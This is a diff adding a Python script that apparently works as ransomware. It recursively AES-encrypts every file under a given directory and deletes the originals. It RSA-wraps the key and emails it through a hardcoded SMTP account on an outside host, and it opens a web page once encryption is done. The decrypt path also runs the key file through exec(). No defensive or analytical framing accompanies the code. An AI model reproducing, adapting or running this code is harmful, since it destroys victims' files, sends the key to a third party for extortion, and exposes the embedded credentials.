@@ -1,0 +1,143 @@
+#!/usr/bin/python3
+
+from sys import argv
+from os import walk, lstat
+from os.path import getsize, splitext, join
+from os import remove as rm
+from struct import pack, unpack, calcsize
+from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+import Crypto.Random as rand
+import webbrowser
+import smtplib
+
+def enc_key(key):
+        k = rand.new().read(1)
+        f = open("pubkey", "r");
+        pub = RSA.importKey(f.read())
+        f.close()
+        return (pub.encrypt(key, k))
+
+def unlock_key(key):
+    f = open("privkey", "r");
+    priv = RSA.importKey(f.read())
+    f.close()
+    return (priv.decrypt(key))                
+
+def sendMail(FROM, PASSWD, TO, TEXT, SERVER):
+    message = """\
+    From: %s
+    To: %s
+    %s
+    """ % (FROM, TO, TEXT)
+    server = smtplib.SMTP(SERVER)
+    server.starttls()
+    server.login(FROM, PASSWD)
+    server.sendmail(FROM, TO, message)
+    server.quit()
+
+def mail(s):
+    sender='youhavebeenhacked@pata.ovh'
+    mdp='bunny12pixel'
+    server='mail.pata.ovh:587'
+    sendMail(sender,mdp,sender,s,server)
+
+if len(argv) != 3 or not argv[2] in ["c", "d"]:
+    print("To encrypt :\n{} dir c\n\nTo decrypt :\n{} dir d".format(argv[0], argv[0]))
+    exit(0)
+
+if argv[2] == "c":
+    CRYPT=True
+else:
+    CRYPT=False
+LEN_READ=1024
+FILE_EXT='.enc'
+
+def recur_mtime(path):
+    for dirpath, dirnames, filenames in walk(path):
+        for fn in filenames:
+            filepath=join(dirpath, fn)
+            mtime=lstat(filepath).st_mtime
+            yield mtime, filepath
+
+def walk_sorted(path):
+    for mtime, filepath in sorted(recur_mtime(path)):
+        yield filepath
+
+def crypt(key, filename):
+    global LEN_READ, FILE_EXT
+    newname=filename+FILE_EXT
+    iv=rand.new().read(16)
+    size=getsize(filename)
+    cryptor = AES.new(key, AES.MODE_CBC, iv)
+    with open(filename, "rb") as f_in:
+        with open(newname, "wb") as f_out:
+            f_out.write(pack('Q', size))
+            f_out.write(iv)
+            while True:
+                txt=f_in.read(LEN_READ)
+                l=len(txt)
+                if l != LEN_READ:
+                    if not l:
+                        break
+                    txt+=rand.new().read(LEN_READ - l)
+                f_out.write(cryptor.encrypt(txt))
+                del txt
+                
+def crypted_file(filename):
+    global FILE_EXT
+    return (True if filename.endswith(FILE_EXT) else False)
+
+def decrypt(key, filename):
+    global LEN_READ, FILE_EXT
+    newname=splitext(filename)[0]
+    with open(newname, "wb") as f_out:
+        with open(filename, "rb") as f_in:
+            size = unpack('Q', f_in.read(calcsize('Q')))[0]
+            iv = f_in.read(16)
+            cryptor = AES.new(key, AES.MODE_CBC, iv)
+            while True:
+                txt=f_in.read(LEN_READ)
+                if not len(txt):
+                    break
+                f_out.write(cryptor.decrypt(txt))
+                del txt
+            f_out.truncate(size)
+
+try:
+        if CRYPT:
+                key=rand.new().read(16)
+                sent_key=enc_key(key)
+                mail(sent_key[0])
+                with open("key", "w") as k:
+                        k.write("%s"%sent_key)
+        else:
+                key=""
+                with open("key", "r") as k:
+                        exec("key = %s"%(k.read()))
+                        key=unlock_key(key)
+except:
+        print("Key failure")
+        exit(0)
+if len(key)!=16:
+        print("Key failure")
+        exit(0)
+
+for name in walk_sorted(argv[1]):
+    if CRYPT and not crypted_file(name):
+        try:
+            crypt(key, name)
+        except:
+            print("Can't encrypt : {}".format(name))
+        else:
+            rm(name)
+    elif not CRYPT and crypted_file(name):
+        try:
+            decrypt(key, name)
+        except:
+            print("Can't decrypt : {}".format(name))
+        else:
+            rm(name)
+
+if CRYPT:
+    webbrowser.open_new('http://bunnypixelarray.github.io')
